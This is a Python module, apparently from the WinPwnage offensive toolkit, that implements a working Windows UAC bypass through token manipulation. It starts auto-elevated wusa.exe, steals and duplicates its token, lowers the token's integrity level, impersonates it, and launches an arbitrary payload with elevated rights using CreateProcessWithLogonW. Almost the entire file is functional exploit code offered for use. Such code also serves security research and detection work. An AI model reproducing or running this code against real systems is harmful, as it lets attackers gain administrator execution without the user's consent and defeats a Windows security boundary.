from ctypes.wintypes import *
from ctypes import *
from enum import IntEnum
from winpwnage.core.prints import *
from winpwnage.core.utils import *
import os

tokenmanipulation_info = {
	"Description": "Bypass UAC using token manipulation",
	"Id": "15",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "tokenmanipulation",
	"Function Payload": True,
}

#https://gist.github.com/highsenburger69/b86eb4db41e651a6518fd61d88aa9f91

kernel32 = WinDLL("kernel32", use_last_error=True)
advapi32 = WinDLL("advapi32", use_last_error=True)
shell32 = WinDLL("shell32", use_last_error=True)
ntdll = WinDLL("ntdll", use_last_error=True)

class c_enum(IntEnum):
    @classmethod
    def from_param(cls, obj):
        return c_int(cls(obj))

class SECURITY_IMPERSONATION_LEVEL(c_int):
    SecurityAnonymous = 0
    SecurityIdentification = SecurityAnonymous + 1
    SecurityImpersonation = SecurityIdentification + 1

class TOKEN_INFORMATION_CLASS(c_enum):
	TokenIntegrityLevel = 25

class TOKEN_TYPE(c_enum):
	TokenPrimary = 1
	TokenImpersonation = 2

class IntegrityLevel(object):
    SECURITY_MANDATORY_UNTRUSTED_RID = 0x00000000
    SECURITY_MANDATORY_LOW_RID = 0x00001000
    SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
    SECURITY_MANDATORY_MEDIUM_PLUS_RID = SECURITY_MANDATORY_MEDIUM_RID + 0x100
    SECURITY_MANDATORY_HIGH_RID = 0X00003000
    SECURITY_MANDATORY_SYSTEM_RID = 0x00004000
    SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000

class GroupAttributes(object):
    SE_GROUP_ENABLED = 0x00000004
    SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002 
    SE_GROUP_INTEGRITY = 0x00000020         
    SE_GROUP_INTEGRITY_ENABLED = 0x00000040
    SE_GROUP_LOGON_ID = 0xC0000000 
    SE_GROUP_MANDATORY = 0x00000001 
    SE_GROUP_OWNER = 0x00000008   
    SE_GROUP_RESOURCE = 0x20000000 
    SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010        

class SECURITY_ATTRIBUTES(Structure): 
    _fields_ = [('nLength', DWORD),
               ('lpSecurityDescriptor', LPVOID),                
               ('bInheritHandle', BOOL)]

class SID_IDENTIFIER_AUTHORITY(Structure): 
    _fields_ = [('Value', BYTE * 6)]                                     

class SID_AND_ATTRIBUTES(Structure):
    _fields_ = [ ('Sid', c_void_p), ('Attributes', DWORD)]

class TOKEN_MANDATORY_LABEL(Structure):
    _fields_ = [('Label', SID_AND_ATTRIBUTES),]

class STARTUPINFO(Structure):
    _fields_ = [('cb', DWORD),
               ('lpReserved', c_void_p),
               ('lpDesktop', c_void_p),
               ('lpTitle', c_void_p),
               ('dwX', DWORD),
               ('dwY', DWORD),
               ('dwXSize', DWORD), 
               ('dwYSize', DWORD),                      
               ('dwXCountChars', DWORD),                     
               ('dwYCountChars', DWORD),                       
               ('dwFillAttribute', DWORD),                     
               ('dwFlags', DWORD),                      
               ('wShowWindow', WORD),                    
               ('cbReserved2', WORD),                    
               ('lpReserved2', c_char_p),                   
               ('hStdInput', HANDLE),                      
               ('hStdOutput', HANDLE),                      
               ('hStdError', HANDLE)]
			   
class ShellExecuteInfo(Structure):
    _fields_ = [('cbSize', DWORD),
				('fMask', ULONG),
				('hwnd', HWND),
                ('lpVerb', c_char_p),
				('lpFile', c_char_p),
				('lpParameters', c_char_p),   
                ('lpDirectory', c_char_p),
				('nShow', c_int),
				('hInstApp', HINSTANCE),          
                ('lpIDList', LPVOID),
				('lpClass', LPSTR),
				('hKeyClass', HKEY),      
                ('dwHotKey', DWORD),
				('hIcon', HANDLE),
				('hProcess', HANDLE)]
			   
class PROCESS_INFORMATION(Structure):
    _fields_ = [('hProcess', HANDLE),
               ('hThread', HANDLE),
               ('dwProcessId', DWORD),
               ('dwThreadId', DWORD)]

#https://msdn.microsoft.com/en-us/library/cc704588.aspx
NTSTATUS = c_ulong
STATUS_UNSUCCESSFUL = NTSTATUS(0xC0000001)

#https://msdn.microsoft.com/en-us/library/windows/desktop/aa379607(v=vs.85).aspx
SYNCHRONIZE = 0x00100000
DELETE = 0x00010000
READ_CONTROL = 0x00020000
WRITE_DAC = 0x00040000
WRITE_OWNER = 0x00080000
STANDARD_RIGHTS_READ = READ_CONTROL
STANDARD_RIGHTS_WRITE = READ_CONTROL
STANDARD_RIGHTS_REQUIRED = 0x000F0000

#https://msdn.microsoft.com/en-us/library/windows/desktop/aa374905(v=vs.85).aspx
TOKEN_ADJUST_PRIVILEGES = 0x00000020
TOKEN_QUERY = 0x00000008
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
					TOKEN_ASSIGN_PRIMARY |
					TOKEN_DUPLICATE |
					TOKEN_IMPERSONATE |
					TOKEN_QUERY |
					TOKEN_QUERY_SOURCE |
					TOKEN_ADJUST_PRIVILEGES |
					TOKEN_ADJUST_GROUPS |
					TOKEN_ADJUST_DEFAULT |
					TOKEN_ADJUST_SESSIONID) 

GetLastError = kernel32.GetLastError
GetLastError.restype = DWORD

TerminateProcess = kernel32.TerminateProcess
TerminateProcess.restype = BOOL
TerminateProcess.argtypes = [HANDLE, UINT]

WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.restype = DWORD
WaitForSingleObject.argtypes = [HANDLE, DWORD]

PHANDLE = POINTER(HANDLE)
NtOpenProcessToken = ntdll.NtOpenProcessToken
NtOpenProcessToken.restype = BOOL
NtOpenProcessToken.argtypes = [HANDLE, DWORD, PHANDLE]

NtSetInformationToken = ntdll.NtSetInformationToken
NtSetInformationToken.restype = NTSTATUS
NtSetInformationToken.argtypes = [ HANDLE, TOKEN_INFORMATION_CLASS, c_void_p, ULONG]

ImpersonateLoggedOnUser = advapi32.ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.restype = BOOL
ImpersonateLoggedOnUser.argtypes = [HANDLE]

PShellExecuteInfo = POINTER(ShellExecuteInfo)
ShellExecuteEx = shell32.ShellExecuteEx
ShellExecuteEx.restype = BOOL
ShellExecuteEx.argtypes = [PShellExecuteInfo]

PSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
LPSECURITY_ATTRIBUTES = PSECURITY_ATTRIBUTES
DuplicateTokenEx = advapi32.DuplicateTokenEx
DuplicateTokenEx.restype = BOOL
DuplicateTokenEx.argtypes = [HANDLE, DWORD, LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE]

PSID_IDENTIFIER_AUTHORITY = POINTER(SID_IDENTIFIER_AUTHORITY)
PSID = LPVOID
RtlAllocateAndInitializeSid = ntdll.RtlAllocateAndInitializeSid
RtlAllocateAndInitializeSid.restype = BOOL
RtlAllocateAndInitializeSid.argtypes = [PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID]

PTOKEN_GROUPS = LPVOID
PTOKEN_PRIVILEGES = LPVOID
PTOKEN_GROUPS = LPVOID
NtFilterToken = ntdll.NtFilterToken
NtFilterToken.restype = NTSTATUS
NtFilterToken.argtypes = [HANDLE, ULONG, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_GROUPS, PHANDLE]

LPSTARTUPINFO = POINTER(STARTUPINFO)
LPPROCESS_INFORMATION = POINTER(PROCESS_INFORMATION)
CreateProcessWithLogonW = advapi32.CreateProcessWithLogonW
CreateProcessWithLogonW.restype	= BOOL
CreateProcessWithLogonW.argtypes = [LPCWSTR, LPCWSTR, LPCWSTR, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION]                                                  

def tokenmanipulation(payload):
	if payloads().exe(payload):
		print_info("Launching elevated process")
		ShellExecute = ShellExecuteInfo()
		ShellExecute.cbSize = sizeof(ShellExecute)
		ShellExecute.fMask = 0x00000040 
		ShellExecute.lpFile = u"wusa.exe"
		ShellExecute.nShow = 0

		if ShellExecuteEx(byref(ShellExecute)) == 0:
			print_error("Error while triggering elevated binary using ShellExecuteEx: {}".format(GetLastError()))
		else:
			print_success("Successfully started process")

		print_info("Grabbing token")
		hToken = HANDLE(c_void_p(-1).value)
		if NtOpenProcessToken(ShellExecute.hProcess, 0x02000000, byref(hToken)) == STATUS_UNSUCCESSFUL:
			print_error("Error while opening target process token using NtOpenProcessToken: {}".format(GetLastError()))

		TerminateProcess(ShellExecute.hProcess, -1)
		WaitForSingleObject(ShellExecute.hProcess, -1)

		print_info("Opening token of elevated process")
		newhToken = HANDLE(c_void_p(-1).value)
		SECURITY_ATTRIBUTE = SECURITY_ATTRIBUTES()

		if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, byref(SECURITY_ATTRIBUTE),                     
										SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, 
										TOKEN_TYPE.TokenPrimary, byref(newhToken))  == STATUS_UNSUCCESSFUL:
			print_error("Error while duplicating Primary token using DuplicateTokenEx: {}".format(GetLastError()))

		print_info("Duplicating primary token")
		mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
		pIntegritySid = PSID()

		if RtlAllocateAndInitializeSid(byref(mlAuthority), 1, IntegrityLevel.SECURITY_MANDATORY_MEDIUM_RID,
										0, 0, 0, 0, 0, 0, 0, byref(pIntegritySid)) == STATUS_UNSUCCESSFUL:
			print_error("Error while initializing Medium IL SID using RtlAllocateAndInitializeSid: {}".format(GetLastError()))

		print_info("Initializing a SID for Medium Integrity level")
		SID_AND_ATTRIBUTE = SID_AND_ATTRIBUTES()
		SID_AND_ATTRIBUTE.Sid = pIntegritySid
		SID_AND_ATTRIBUTE.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
		TOKEN_MANDATORY = TOKEN_MANDATORY_LABEL()
		TOKEN_MANDATORY.Label = SID_AND_ATTRIBUTE

		if NtSetInformationToken(newhToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
									byref(TOKEN_MANDATORY), sizeof(TOKEN_MANDATORY)) == STATUS_UNSUCCESSFUL:
			print_error("Error while setting medium IL token using NtSetInformationToken: {}".format(GetLastError()))

		print_info("Now we are lowering the token's integrity level from High to Medium")
		hLuaToken = HANDLE(c_void_p(-1).value)
		if NtFilterToken(newhToken, 0x4, None, None, None, byref(hLuaToken)) == STATUS_UNSUCCESSFUL:
			print_error("Error while creating a restricted token using NtFilterToken: {}".format(GetLastError()))
			
		print_info("Creating restricted token")
		ImpersonateLoggedOnUser(hLuaToken)

		print_info("Impersonating logged on user")
		lpStartupInfo = STARTUPINFO()
		lpStartupInfo.cb = sizeof(lpStartupInfo)
		lpProcessInformation = PROCESS_INFORMATION()
		lpStartupInfo.dwFlags = 0x00000001
		lpStartupInfo.wShowWindow = 5
		lpApplicationName = payload

		if CreateProcessWithLogonW(u"aaa", u"bbb", u"ccc",0x00000002, lpApplicationName, None,
									0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
			print_error("Error while triggering admin payload using CreateProcessWithLogonW: {}".format(GetLastError()))
		else:
			print_success("Successfully executed payload with PID: {}".format(lpProcessInformation.dwProcessId))
	else:
		print_error("Cannot proceed, invalid payload")
		return False